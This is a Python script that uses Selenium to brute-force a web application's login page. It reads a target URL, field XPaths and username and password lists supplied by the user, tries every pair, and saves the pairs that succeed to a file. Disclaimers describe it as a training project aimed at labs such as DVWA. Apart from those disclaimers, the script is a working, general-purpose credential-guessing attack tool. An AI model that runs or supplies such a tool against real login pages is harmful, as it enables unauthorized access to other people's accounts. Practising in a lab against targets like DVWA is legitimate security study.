"""Quick script to brute force password into an app.
DISCLAIMER: Never use this script for illegal purposes. This was created as a project only and should not be used
in any malicious way."""

from selenium import webdriver
from selenium.webdriver.common.by import By
import time

print("+++--------------------------------------------------------------------------------------+++")
print("+++---------------------------------------BRUTE PW---------------------------------------+++")
print("+++--------------------------------------------------------------------------------------+++")
print("[+] Disclaimer: This script should never be utilized for malicious purposes and only as a training tool.")
print("[+] Ensure you have permission to attacking a target prior to utilizing this tool.")
print("[+] This tool will not bypass 2FA or Captcha.")
print("[+] Warning: Most modern apps will detect multiple failed login attempts and block further attempts.")

"""
The driver path is specific to the browser being utilized.  The chromedriver can be installed from 
https://chromedriver.chromium.org/downloads . 
Download and unzip exe for your OS and place in folder where it won't be deleted.  Selenium will use this browser 
specific driver to communicate with the browser.  Each browser will have their own specific driver.
"""
# Chrome driver path should reference the .exe browser driver.
print("[+] Provide the driver path to your specific browser being utilized.")
print("[+] Utilize https://chromedriver.chromium.org/downloads to download the latest chrome driver.")
print("[+] Save the exe in the same file location as this script")
CHROME_DRIVER_PATH = input("[+] Name of driver file--> ")

"""Specify url to login page of the app. Forewarning that most websites prevent multiple attempts to login with
incorrect credentials. This script will not bypass this. The XPATH to the login, the password, and submit button
will need to be modified depending on the website. This script will not bypass 2FA or captcha."""
# As an example below, I'm specifying Metasploitable DVWA web app as a target with the private IPv4
TARGET_URL = input("[+] Specify target URL--> ")

"""The following XPATHS below need to be added depending on the app you're trying to login into"""
LOGIN_XPATH = input("[+] Specify XPATH for username input field--> ")  # Login entry field XPATH
PW_XPATH = input("[+] Specify XPATH for password input field--> ")  # Password entry field XPATH
LOGIN_BUTTON_XPATH = input("[+] Specify XPATH for Login/Submit Button--> ")  # Login/Submit button XPATH

"""Specify separate .txt files for the usernames and passwords to attempt. See example files provided."""
USERNAMES = input("[+] Specify usernames text file. Each username should attempt should be on a separate line--> ")
PASSWORDS = input("[+] Specify usernames text file. Each username should attempt should be on a separate line--> ")

POSSIBLE_LOGINS = []

proceed = input("[+] Proceed (y/n)--> ")

if proceed == "y":
	print("[+] Brute Login Proceeding...\n" * 3)
	# Open username and password files and create lists of both of them
	print("[+] Opening usernames file...")
	with open(USERNAMES, "r") as u:
		username_list = u.readlines()
		print(f"[+] Usernames Detected in file--> {len(username_list)}")
	print("[+] Opening passwords file...")
	with open(PASSWORDS, "r") as p:
		password_list = p.readlines()
		print(f"[+] Passwords Detected in file--> {len(password_list)}")

	# Create object from driver
	print("[+] Attempting to create driver object...")
	try:
		driver = webdriver.Chrome(executable_path=CHROME_DRIVER_PATH)
	except:
		print("[+] Driver object was not created. Confirm correct driver was utilized and path is correct.")
		print(f"[+] Driver path --> {CHROME_DRIVER_PATH}")
		exit()
	print("[+] Driver object created...")

	# Open the app
	print("[+] Attempting to open URL from browser...")
	try:
		driver.get(url=TARGET_URL)
	except TimeoutError:
		print("[+] Timeout Error detected. Possible incorrect URL given. Try Again.")
		exit()
	print("[+] App login page opened...")

	# Sleep for 3 seconds to allow the page to load
	time.sleep(3)
	print(f"[+] {TARGET_URL} retrieved. Currently attempting to brute login...")

	# Run through all username and password combinations
	try:
		for username in username_list:
			driver.find_element(By.XPATH, LOGIN_XPATH).send_keys(username)
			time.sleep(1)  # Adjust sleep timers as needed
			for password in password_list:
				driver.find_element(By.XPATH, PW_XPATH).send_keys(password)
				time.sleep(1)
				driver.find_element(By.XPATH, LOGIN_BUTTON_XPATH).click()
				time.sleep(1)
				# If the target URL does not change then script assumes login failed and tries again
				# This may not always work depending on the app
				if driver.current_url == TARGET_URL:
					pass
				else:
					print(f"[+] Positive Response to: USERNAME = {username} & PASSWORD = {password}")
					POSSIBLE_LOGINS.append({"Username": username, "Password": password})
					driver.quit()  # Quit browser session and reopen new window to attempt new login
					driver = webdriver.Chrome(executable_path=CHROME_DRIVER_PATH)
					driver.get(url=TARGET_URL)  # Redirect to login page
					time.sleep(3)
	except TimeoutError:
		pass
elif proceed == "n":
	print("[+] Brute force login canceled. Exiting from script...")
	exit()
else:
	print("[+] Invalid answer. Exiting from script...")
	exit()

if POSSIBLE_LOGINS:
	print('[+] Possible login combinations have been written to a file in this directory as "Login_Credentials.txt"')
	with open("Login_Credentials.txt", "w") as f:
		for login in POSSIBLE_LOGINS:
			f.write(f"{login}\n")
else:
	print("[+] No login combinations detected based on files provided.")

